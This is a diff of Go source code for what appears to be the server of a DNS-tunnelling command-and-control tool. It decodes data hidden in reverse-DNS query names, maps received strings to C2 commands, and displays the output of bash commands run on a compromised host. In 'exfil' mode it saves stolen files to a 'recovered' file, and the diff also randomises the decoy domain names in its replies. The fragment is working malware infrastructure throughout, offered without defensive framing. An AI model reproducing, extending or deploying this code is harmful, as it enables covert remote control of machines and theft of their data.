@@ -60,35 +60,36 @@ func decodeAddress(octets []string, b *int, m *string, c *bool, lsb *[]byte) str
 			bytes = append(bytes, d2...)
 		}
 
-		// If the current mode is exfiltration, append the bytes to the output file ("recovered").
-		if *m == "exfil" {
-			// Open the file into which recovered data will be appended, with settings such that data can be added appropriately.
-			f, _ := os.OpenFile("recovered", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
-			if _, err := f.Write(bytes); err != nil {
-				f.Close()
-				log.Fatal(err)
-			}
-			if err := f.Close(); err != nil {
-				log.Fatal(err)
-			}
-		} else { // If the current mode is C2 communication, interpret the bytes as a command.
-			command := string(bytes[:])
-			if *c && command != "/f/" && command != "/b/" {
-				// While collecting, continue appending all received bytes to the ls byte slice instead of interpreting them as commands
-				*lsb = append((*lsb), []byte(command)...)
-			} else {
-				switch command {
-				case "/b/": // Begin collecting the output bytes of the bash command
-					fmt.Printf("[!] Collecting output of the executed command.")
-					*c = true
-				case "/f/": // Finish collecting the output bytes of the bash command, and output the gathered data.
-					fmt.Printf("~$ %v", string(*lsb))
-					*lsb = []byte{}
-					*c = false
-				default: // Otherwise, return the c2 command outlined in the c2_mappings map.
-					c2_command = c2_mappings[command]
+		command := string(bytes[:])
+		if *c && command != "/f/" && command != "/b/" {
+			// While collecting, continue appending all received bytes to the ls byte slice instead of interpreting them as commands
+			*lsb = append((*lsb), []byte(command)...)
+		} else {
+			switch command {
+			case "/b/": // Begin collecting the output bytes of the bash command
+				fmt.Printf("[!] Collecting output of the executed command. Bash command output will be displayed here, while exfiltrated data will be saved to a file.\n")
+				*c = true
+			case "/f/": // Finish collecting the output bytes of the bash command, and output the gathered data.
+				if *m == "exfil" {
+					f, _ := os.OpenFile("recovered", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+					if _, err := f.Write(*lsb); err != nil {
+						f.Close()
+						log.Fatal(err)
+					}
+					if err := f.Close(); err != nil {
+						log.Fatal(err)
+					}
+					fmt.Printf("[$] Completed exfiltration of file. Wrote to 'recovered'.\n")
+				} else {
+					fmt.Printf("~$ %v\n", string(*lsb))
 				}
+
+				*lsb = []byte{}
+				*c = false
+			default: // Otherwise, return the c2 command outlined in the c2_mappings map.
+				c2_command = c2_mappings[command]
 			}
+			//}
 		}
 	}
 
@@ -104,7 +105,9 @@ func handleRequest(w dns.ResponseWriter, r *dns.Msg) {
 	if err != nil {
 		panic(err)
 	}
-	word := g.Word()
+	subdomain := g.Word()
+	domain := g.Word()
+	word := fmt.Sprintf("%v.%v.com", subdomain, domain)
 
 	// Retrieve the octets being sent over.
 	var ipv4 []string = strings.Split(r.Question[0].Name, ".in-addr.arpa.")
